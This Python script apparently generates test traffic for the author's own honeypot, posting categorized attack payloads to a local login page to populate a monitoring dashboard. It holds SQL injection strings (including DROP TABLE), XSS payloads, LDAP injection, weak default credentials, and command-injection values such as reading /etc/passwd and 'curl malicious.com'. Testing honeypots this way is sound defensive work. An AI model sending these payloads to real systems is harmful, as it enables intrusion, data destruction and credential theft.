"""
Generate Test Attacks for Honeypot
Automatically creates various attack types to populate the dashboard
"""

import requests
import time
import random
from datetime import datetime

HONEYPOT_URL = "http://192.168.30.107:8080/login" 
# Different attack payloads categorized by type
ATTACK_PAYLOADS = {
    'sql_injection': [
        {"username": "admin' OR '1'='1", "password": "password"},
        {"username": "admin", "password": "' OR '1'='1' --"},
        {"username": "' UNION SELECT * FROM users --", "password": "pass"},
        {"username": "admin'; DROP TABLE users; --", "password": "anything"},
        {"username": "1' OR 1=1 --", "password": "test"},
    ],
    
    'xss': [
        {"username": "<script>alert('XSS')</script>", "password": "pass"},
        {"username": "admin", "password": "<img src=x onerror=alert(1)>"},
        {"username": "javascript:alert(document.cookie)", "password": "test"},
        {"username": "<svg onload=alert('XSS')>", "password": "pass"},
        {"username": "admin", "password": "test<script>alert('XSS')</script>"},
    ],
    
    'command_injection': [
        {"username": "admin; ls -la", "password": "pass"},
        {"username": "test && cat /etc/passwd", "password": "anything"},
        {"username": "admin | whoami", "password": "test"},
        {"username": "user; ping -c 10 127.0.0.1", "password": "pass"},
        {"username": "admin && curl malicious.com", "password": "test"},
    ],
    
    'ldap_injection': [
        {"username": "*)(uid=*", "password": "pass"},
        {"username": "admin)(cn=*", "password": "anything"},
        {"username": "user*)(objectClass=*", "password": "test"},
        {"username": "*", "password": "*)(uid=admin"},
        {"username": "admin)(mail=*", "password": "pass"},
    ],
    
    'admin_unlock': [
        {"username": "admin", "password": "admin123"},
        {"username": "administrator", "password": "admin123"},
        {"username": "root", "password": "admin123"},
        {"username": "admin", "password": "Admin123!"},
        {"username": "admin", "password": "admin123"},
    ],
    
    'brute_force': [
        {"username": "admin", "password": "123456"},
        {"username": "admin", "password": "password"},
        {"username": "root", "password": "qwerty"},
        {"username": "admin", "password": "12345678"},
        {"username": "user", "password": "abc123"},
        {"username": "admin", "password": "password123"},
        {"username": "test", "password": "letmein"},
        {"username": "admin", "password": "welcome"},
    ],
    
    'login_attempt': [
        {"username": "john_doe", "password": "mypassword"},
        {"username": "test_user", "password": "testpass"},
        {"username": "user123", "password": "pass456"},
        {"username": "alice", "password": "alicepass"},
        {"username": "bob", "password": "bobsecret"},
    ]
}

def send_attack(attack_type, payload):
    """Send a single attack to the honeypot"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.post(
            HONEYPOT_URL,
            data=payload,
            headers=headers,
            timeout=5
        )
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] ✅ {attack_type:20s} | Username: {payload['username']:30s} | Status: {response.status_code}")
        return True
        
    except requests.exceptions.ConnectionError:
        print(f"❌ ERROR: Cannot connect to honeypot at {HONEYPOT_URL}")
        print(f"   Make sure the honeypot is running: python simple_honeypot.py")
        return False
    except Exception as e:
        print(f"❌ Error sending attack: {e}")
        return False

def generate_attacks(count_per_type=5, delay=1):
    """Generate multiple attacks of each type"""
    print("="*80)
    print("🎯 HONEYPOT ATTACK GENERATOR")
    print("="*80)
    print(f"Target: {HONEYPOT_URL}")
    print(f"Attacks per type: {count_per_type}")
    print(f"Delay between attacks: {delay} seconds")
    print("="*80)
    print()
    
    total_attacks = 0
    successful_attacks = 0
    
    for attack_type, payloads in ATTACK_PAYLOADS.items():
        print(f"\n📍 Generating {attack_type.upper()} attacks...")
        print("-"*80)
        
        for i in range(count_per_type):
            # Pick a random payload from this attack type
            payload = random.choice(payloads)
            
            if send_attack(attack_type, payload):
                successful_attacks += 1
            
            total_attacks += 1
            time.sleep(delay)
    
    print()
    print("="*80)
    print(f"✅ Attack generation complete!")
    print(f"   Total attacks: {total_attacks}")
    print(f"   Successful: {successful_attacks}")
    print(f"   Failed: {total_attacks - successful_attacks}")
    print("="*80)
    print()
    print("📊 Check your Live Operator Dashboard at: http://192.168.30.107:8080/login")
    print("   The attacks should be categorized by type in the analytics!")

if __name__ == "__main__":
    import sys
    
    # Parse command line arguments
    count = 5
    delay = 1
    
    if len(sys.argv) > 1:
        try:
            count = int(sys.argv[1])
        except ValueError:
            print("Usage: python generate_test_attacks.py [count_per_type] [delay_seconds]")
            sys.exit(1)
    
    if len(sys.argv) > 2:
        try:
            delay = float(sys.argv[2])
        except ValueError:
            print("Usage: python generate_test_attacks.py [count_per_type] [delay_seconds]")
            sys.exit(1)
    
    print()
    generate_attacks(count_per_type=count, delay=delay)
